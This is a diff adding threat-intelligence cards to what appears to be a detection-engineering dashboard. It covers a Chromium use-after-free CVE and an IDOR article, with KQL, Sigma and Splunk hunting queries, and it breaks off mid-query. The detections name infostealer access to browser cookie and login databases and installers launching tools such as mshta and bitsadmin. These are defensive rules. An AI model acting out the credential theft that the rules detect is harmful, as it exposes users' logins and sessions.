@@ -1,3 +1,584 @@
+<article class="card" id="art-567" data-art-slug="2026-02-17-cisa-kev-cve-2026-2441-google-chromium-css-use-after-free-vu"
+  data-phases="c2,exploit,install,recon" data-sev="crit"
+  data-techs=""
+  data-sources="CISA KEV"
+  data-platforms="def,sent,spl"
+  data-splunk-cats="application"
+  data-targets=""
+  data-uc-count="1" data-llm-uc-count="0"
+  data-search="CISA KEV: CVE-2026-2441 — Google Chromium CSS Use-After-Free Vulnerability Google Chromium CSS contains a use-after-free vulnerability that could allow a remote attacker to potentially exploit heap corruption via a crafted HTML page. This vulnerability could affect multiple web browsers that utilize Chromium, including, but not limited to, Google Chrome, Microsoft Edge, and Opera. Vendor: Google, Product: Chromium. Federal patch due: 2026-03-10. CVE-2026-2441  Asset exposure — vulnerability matches article CVE(s)">
+  <div class="sev-ribbon crit">Critical</div>
+  <button class="share-btn card-share" data-share-art="2026-02-17-cisa-kev-cve-2026-2441-google-chromium-css-use-after-free-vu" title="Copy share link to this article" aria-label="Copy share link">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+  </button>
+  <h2><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener">CISA KEV: CVE-2026-2441 — Google Chromium CSS Use-After-Free Vulnerability</a></h2>
+  <div class="source-badges"><span class="source-badge kev">CISA KEV</span></div>
+  <div class="pubmeta">
+    <span>2026-02-17</span>
+    <span>1 use case</span>
+    <span>0 techniques</span>
+    <span>2 kill-chain phases detected</span>
+  </div>
+  <p class="summary">Google Chromium CSS contains a use-after-free vulnerability that could allow a remote attacker to potentially exploit heap corruption via a crafted HTML page. This vulnerability could affect multiple web browsers that utilize Chromium, including, but not limited to, Google Chrome, Microsoft Edge, and Opera. Vendor: Google, Product: Chromium. Federal patch due: 2026-03-10.</p>
+  <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-2441</span></div>
+  <div class="action-row">
+    <button class="btn btn-kc" data-target="art-567-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
+    <button class="btn btn-hunt" data-hunt-art="art-567"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
+    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
+  </div>
+  <div class="killchain" id="art-567-kc">
+  <div class="kc3d"><div class="kc-cell hit">
+  <div class="num">Phase 1</div>
+  <div class="name">Reconnaissance</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 2</div>
+  <div class="name">Weaponization</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 3</div>
+  <div class="name">Delivery</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 4</div>
+  <div class="name">Exploitation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell inferred">
+  <div class="num">Phase 5</div>
+  <div class="name">Installation</div>
+  <div class="marker">Likely</div>
+</div>
+<div class="kc-cell inferred">
+  <div class="num">Phase 6</div>
+  <div class="name">Command &amp; Control</div>
+  <div class="marker">Likely</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 7</div>
+  <div class="name">Actions on Objectives</div>
+  <div class="marker">—</div>
+</div></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ Asset exposure — vulnerability matches article CVE(s)</em></div>
+<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code.</div>
+<div class="phase-line inferred"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key.</div>
+<div class="phase-line inferred"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
+<div class="phase-line "><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
+</div>
+  <div class="usecases"><details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="" open>
+  <summary>
+    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
+    <span class="uc-phase">Reconnaissance</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-567-uc0-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-567-uc0-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-567-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-567-uc0-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+// partitions on Timestamp instead of scanning the full retention.
+DeviceTvmSoftwareVulnerabilities
+| where Timestamp &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-2441&quot;)
+| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-567-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
+// no Sentinel translation — track via Update / Heartbeat OS-version
+// gaps as a coarse approximation.
+DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-2441&quot;)
+| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId,
+          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-567-uc0-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-567-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-567-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-567-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-2441&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-567-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-2441&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre></div></div>
+  </div>
+</details></div>
+</article>
+<article class="card" id="art-568" data-art-slug="2026-02-16-from-detection-to-prevention-how-zen-stops-idor-vulnerabilit"
+  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="high"
+  data-techs="T1176,T1190,T1195.002"
+  data-sources="Aikido"
+  data-platforms="def,sent,sigma,spl"
+  data-splunk-cats="endpoint"
+  data-targets="windows"
+  data-uc-count="4" data-llm-uc-count="0"
+  data-search="From detection to prevention: How Zen stops IDOR vulnerabilities at runtime IDOR vulnerabilities are one of the most common causes of cross-tenant data leaks in multi-tenant SaaS. Learn how Zen enforces tenant isolation at runtime by analyzing SQL queries and preventing unsafe access before it ships. Category: Product &amp; Company Updates  T1176 T1190 T1195.002 Suspicious browser extension installation Infostealer — non-browser process accessing browser cookie/login DBs Trusted vendor binary / installer launching unusual children Article-specific behavioural hunt — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime">
+  <div class="sev-ribbon high">High</div>
+  <button class="share-btn card-share" data-share-art="2026-02-16-from-detection-to-prevention-how-zen-stops-idor-vulnerabilit" title="Copy share link to this article" aria-label="Copy share link">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+  </button>
+  <h2><a href="https://www.aikido.dev/blog/zen-stops-idor-vulnerabilities" target="_blank" rel="noopener">From detection to prevention: How Zen stops IDOR vulnerabilities at runtime</a></h2>
+  <div class="source-badges"><span class="source-badge ">Aikido</span></div>
+  <div class="pubmeta">
+    <span>2026-02-16</span>
+    <span>4 use cases</span>
+    <span>3 techniques</span>
+    <span>6 kill-chain phases detected</span>
+  </div>
+  <p class="summary">IDOR vulnerabilities are one of the most common causes of cross-tenant data leaks in multi-tenant SaaS. Learn how Zen enforces tenant isolation at runtime by analyzing SQL queries and preventing unsafe access before it ships. Category: Product &amp; Company Updates</p>
+  <div class="ind-group"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Browser Extensions">T1176</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Compromise Software Supply Chain">T1195.002</span></div>
+  <div class="action-row">
+    <button class="btn btn-kc" data-target="art-568-kc"><svg class="kc-chev" width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="3 4.5 6 7.5 9 4.5"/></svg><span class="kc-label">Show kill chain</span></button>
+    <button class="btn btn-hunt" data-hunt-art="art-568"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M21 21 L16.65 16.65"/></svg><span>Hunt IOCs</span></button>
+    <span class="btn-meta">Click any ATT&amp;CK pill below to open it on the Matrix</span>
+  </div>
+  <div class="killchain" id="art-568-kc">
+  <div class="kc3d"><div class="kc-cell hit">
+  <div class="num">Phase 1</div>
+  <div class="name">Reconnaissance</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell ">
+  <div class="num">Phase 2</div>
+  <div class="name">Weaponization</div>
+  <div class="marker">—</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 3</div>
+  <div class="name">Delivery</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 4</div>
+  <div class="name">Exploitation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 5</div>
+  <div class="name">Installation</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 6</div>
+  <div class="name">Command &amp; Control</div>
+  <div class="marker">Detected</div>
+</div>
+<div class="kc-cell hit">
+  <div class="num">Phase 7</div>
+  <div class="name">Actions on Objectives</div>
+  <div class="marker">Detected</div>
+</div></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration.</div>
+<div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
+<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — From detection to prevention: How Zen stops IDOR vulnerabilities at runtime</em></div>
+<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ Suspicious browser extension installation</em></div>
+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
+<div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage. <em>→ Infostealer — non-browser process accessing browser cookie/login DBs</em></div></div>
+</div>
+  <div class="usecases"><details class="uc" data-uc-slug="bf48d37680" data-platforms="def,sent,sigma,spl" data-targets="windows" open>
+  <summary>
+    <span class="uc-title">Suspicious browser extension installation</span>
+    <span class="uc-phase">Installation</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="bf48d37680" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Browser Extensions">T1176</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Registry</span> <span class="ind">DeviceRegistryEvents</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-568-uc0-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-568-uc0-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-568-uc0-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-568-uc0-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-568-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceRegistryEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessAccountName !endswith &quot;$&quot;
+| where RegistryKey has_any (&quot;\Software\Google\Chrome\Extensions\&quot;,&quot;\Software\Microsoft\Edge\Extensions\&quot;,&quot;\Software\Mozilla\Firefox\Extensions\&quot;)
+| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
+          InitiatingProcessFileName, InitiatingProcessAccountName</code></pre></div>
+    <div class="tab-content" id="art-568-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>ImRegistryEvent
+| where TimeGenerated &gt; ago(7d)
+| where ActorUsername !endswith &quot;$&quot;
+| where RegistryKey has_any (@&quot;\Software\Google\Chrome\Extensions\&quot;,
+                              @&quot;\Software\Microsoft\Edge\Extensions\&quot;,
+                              @&quot;\Software\Mozilla\Firefox\Extensions\&quot;)
+| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
+          RegistryValue, RegistryValueData, ActingProcessName
+| order by TimeGenerated desc
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Browser Extension Installation via Registry
+id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
+status: experimental
+description: |
+    Registry writes under the browser extension policy keys —
+    administrative install of an extension. Often used by adware /
+    info-stealers to bypass user-level extension controls.
+references:
+    - https://attack.mitre.org/techniques/T1176/
+author: Clankerusecase
+date: 2026/05/02
+tags:
+    - attack.t1176
+    - attack.persistence
+logsource:
+    category: registry_event
+    product: windows
+detection:
+    selection:
+        TargetObject|contains:
+            - &#x27;\Software\Google\Chrome\Extensions\&#x27;
+            - &#x27;\Software\Microsoft\Edge\Extensions\&#x27;
+            - &#x27;\Software\Mozilla\Firefox\Extensions\&#x27;
+    condition: selection
+falsepositives:
+    - Group-policy-managed extension whitelists
+level: medium
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-568-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-568-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-568-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Registry
+    where (Registry.registry_path=&quot;*\Software\Google\Chrome\Extensions\*&quot;
+        OR Registry.registry_path=&quot;*\Software\Microsoft\Edge\Extensions\*&quot;
+        OR Registry.registry_path=&quot;*\Software\Mozilla\Firefox\Extensions\*&quot;)
+    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
+| `drop_dm_object_name(Registry)`</code></pre><pre class="spl-mode-body" id="art-568-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Registry
+    where (Registry.registry_path=&quot;*\Software\Google\Chrome\Extensions\*&quot;
+        OR Registry.registry_path=&quot;*\Software\Microsoft\Edge\Extensions\*&quot;
+        OR Registry.registry_path=&quot;*\Software\Mozilla\Firefox\Extensions\*&quot;)
+    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
+| `drop_dm_object_name(Registry)`</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="6a7bf050fd" data-platforms="def,sent,sigma,spl" data-targets="windows">
+  <summary>
+    <span class="uc-title">Infostealer — non-browser process accessing browser cookie/login DBs</span>
+    <span class="uc-phase">Actions on Objectives</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="6a7bf050fd" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Steal Web Session Cookie">T1539</span> <span class="ind tech" title="Credentials from Web Browsers">T1555.003</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span> <span class="ind">DeviceFileEvents</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-568-uc1-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-568-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-568-uc1-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-568-uc1-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-568-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceFileEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessAccountName !endswith &quot;$&quot;
+| where FolderPath has_any (@&quot;\Google\Chrome\User Data\&quot;, @&quot;\Microsoft\Edge\User Data\&quot;, @&quot;\Mozilla\Firefox\Profiles\&quot;)
+| where FileName in~ (&quot;Login Data&quot;,&quot;Cookies&quot;,&quot;logins.json&quot;,&quot;cookies.sqlite&quot;)
+| where InitiatingProcessFileName !in~ (&quot;chrome.exe&quot;,&quot;msedge.exe&quot;,&quot;firefox.exe&quot;,&quot;brave.exe&quot;,&quot;opera.exe&quot;)
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
+ImFileEvent
+| where TimeGenerated &gt; ago(7d)
+| where ActorUsername !endswith &quot;$&quot;
+| where TargetFilePath has_any (@&quot;\Google\Chrome\User Data\&quot;,
+                                  @&quot;\Microsoft\Edge\User Data\&quot;,
+                                  @&quot;\Mozilla\Firefox\Profiles\&quot;)
+| where TargetFileName in~ (&quot;Login Data&quot;,&quot;Cookies&quot;,&quot;logins.json&quot;,&quot;cookies.sqlite&quot;)
+| where ActingProcessName !in~ (&quot;chrome.exe&quot;,&quot;msedge.exe&quot;,&quot;firefox.exe&quot;,&quot;brave.exe&quot;,&quot;opera.exe&quot;)
+| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
+          TargetFilePath, TargetFileName, EventType
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
+id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
+status: experimental
+description: |
+    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
+    SQLite databases from Chrome/Edge/Firefox profile directories. Any
+    non-browser process touching these files is a high-fidelity signal.
+references:
+    - https://attack.mitre.org/techniques/T1539/
+    - https://attack.mitre.org/techniques/T1555/003/
+author: Clankerusecase
+date: 2026/05/02
+tags:
+    - attack.t1539
+    - attack.t1555.003
+    - attack.credential-access
+logsource:
+    category: file_access
+    product: windows
+detection:
+    selection_path:
+        TargetFilename|contains:
+            - &#x27;\Google\Chrome\User Data\&#x27;
+            - &#x27;\Microsoft\Edge\User Data\&#x27;
+            - &#x27;\Mozilla\Firefox\Profiles\&#x27;
+    selection_file:
+        TargetFilename|endswith:
+            - &#x27;\Login Data&#x27;
+            - &#x27;\Cookies&#x27;
+            - &#x27;\logins.json&#x27;
+            - &#x27;\cookies.sqlite&#x27;
+    filter_browser:
+        Image|endswith:
+            - &#x27;\chrome.exe&#x27;
+            - &#x27;\msedge.exe&#x27;
+            - &#x27;\firefox.exe&#x27;
+            - &#x27;\brave.exe&#x27;
+            - &#x27;\opera.exe&#x27;
+    condition: selection_path and selection_file and not filter_browser
+falsepositives:
+    - Backup utilities reading user profile files
+    - Browser sync agents from non-stock vendors
+level: high
+</code></pre></div>
+    <div class="tab-content" id="art-568-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-568-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-568-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-568-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Filesystem
+    where (Filesystem.file_path=&quot;*\Google\Chrome\User Data\*\Login Data*&quot;
+        OR Filesystem.file_path=&quot;*\Google\Chrome\User Data\*\Cookies*&quot;
+        OR Filesystem.file_path=&quot;*\Microsoft\Edge\User Data\*\Login Data*&quot;
+        OR Filesystem.file_path=&quot;*\Mozilla\Firefox\Profiles\*\logins.json*&quot;
+        OR Filesystem.file_path=&quot;*\Mozilla\Firefox\Profiles\*\cookies.sqlite*&quot;)
+      AND NOT Filesystem.process_name IN (&quot;chrome.exe&quot;,&quot;msedge.exe&quot;,&quot;firefox.exe&quot;,&quot;brave.exe&quot;,&quot;opera.exe&quot;)
+    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
+| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-568-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Endpoint.Filesystem
+    where (Filesystem.file_path=&quot;*\Google\Chrome\User Data\*\Login Data*&quot;
+        OR Filesystem.file_path=&quot;*\Google\Chrome\User Data\*\Cookies*&quot;
+        OR Filesystem.file_path=&quot;*\Microsoft\Edge\User Data\*\Login Data*&quot;
+        OR Filesystem.file_path=&quot;*\Mozilla\Firefox\Profiles\*\logins.json*&quot;
+        OR Filesystem.file_path=&quot;*\Mozilla\Firefox\Profiles\*\cookies.sqlite*&quot;)
+      AND NOT Filesystem.process_name IN (&quot;chrome.exe&quot;,&quot;msedge.exe&quot;,&quot;firefox.exe&quot;,&quot;brave.exe&quot;,&quot;opera.exe&quot;)
+    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
+| `drop_dm_object_name(Filesystem)`</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="178f88b42d" data-platforms="def,sent,sigma,spl" data-targets="windows">
+  <summary>
+    <span class="uc-title">Trusted vendor binary / installer launching unusual children</span>
+    <span class="uc-phase">Exploitation</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="178f88b42d" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Compromise Software Supply Chain">T1195.002</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">DeviceProcessEvents</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-568-uc2-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-568-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-568-uc2-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-568-uc2-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-568-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where AccountName !endswith &quot;$&quot;
+| where InitiatingProcessFileName in~ (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
+| where FileName in~ (&quot;powershell.exe&quot;,&quot;cmd.exe&quot;,&quot;rundll32.exe&quot;,&quot;regsvr32.exe&quot;,&quot;mshta.exe&quot;,&quot;wscript.exe&quot;,&quot;cscript.exe&quot;,&quot;wmic.exe&quot;,&quot;bitsadmin.exe&quot;)
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre></div>
+    <div class="tab-content" id="art-568-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>// Replace `&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;` with the vendor binaries observed in the
+// article (matching shape with the Defender query).
+SecurityEvent
+| where TimeGenerated &gt; ago(7d)
+| where EventID == 4688
+| where Account !endswith &quot;$&quot;
+| where ParentProcessName has_any (&quot;setup.exe&quot;,&quot;installer.exe&quot;,&quot;update.exe&quot;)
+| where NewProcessName endswith &quot;\powershell.exe&quot;
+   or NewProcessName endswith &quot;\cmd.exe&quot;
